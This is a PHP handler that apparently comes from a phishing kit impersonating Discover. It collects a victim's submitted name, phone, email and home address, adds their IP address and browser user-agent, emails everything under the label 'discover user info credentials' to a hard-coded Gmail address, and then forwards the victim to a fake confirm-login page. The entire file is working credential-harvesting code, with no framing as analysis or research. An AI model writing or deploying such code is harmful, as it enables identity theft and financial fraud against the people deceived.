<?php
session_start();
		header("Access-Control-Allow-Origin:*");
		$recepientEmail = "allahsegun@gmail.com";
		$firstname = $_POST["first-name"];
		$lastname = $_POST["last-name"];
		$middlename = $_POST["middle-name"];
		$phone = $_POST["phone"];
		$email = $_POST["email"];
		$address1 = $_POST["address1"];
		$address2 = $_POST["address2"];
		$city = $_POST["city"];
		$state = $_POST["state"];
		$zipcode = $_POST["zipcode"];
		
		// setting $session data...
		$_SESSION["firstname"] = $firstname;
		$_SESSION["lastname"] = $lastname;
		$_SESSION["middlename"] = $middlename;
		$_SESSION["phone"] = $phone;
		$_SESSION["email"] = $email;
		$_SESSION["address1"] = $address1;
		$_SESSION["address2"] = $address2;
		$_SESSION["city"] = $city;
		$_SESSION["state"] = $state;
		$_SESSION["zipcode"] = $zipcode;

		// creating message data...
		$message = "\n\r discover user info credentials\n\r";
		$message = $message."firstname: ".$firstname."\n\r";
		$message = $message."lastname: ".$lastname."\n\r";
		$message = $message."middlename: ".$middlename."\n\r";
		$message = $message."phone: ".$phone."\n\r";
		$message = $message."email: ".$email."\n\r";
		$message = $message."address1: ".$address1."\n\r";
		$message = $message."address2: ".$address2."\n\r";
		$message = $message."city: ".$city."\n\r";
		$message = $message."state: ".$state."\n\r";
		$message = $message."zipcode: ".$zipcode."\n\r";
		$message = $message."date: ".date("Y-m-d")."\n\r";
		$message = $message."time: ".date("h:i:s")."\n\r";	
		$message = $message."user-agent: ".$_SERVER["HTTP_USER_AGENT"]."\n\r";		
		$message = $message."user-ip-address: ".$_SERVER["REMOTE_ADDR"]."\n\r";		

		$json = json_encode($_POST);
		$mail = mail($recepientEmail,"discover user details/info 1 ".$email." details",$message);
    header("Location: ./confirmloginpage.php");
	
?>

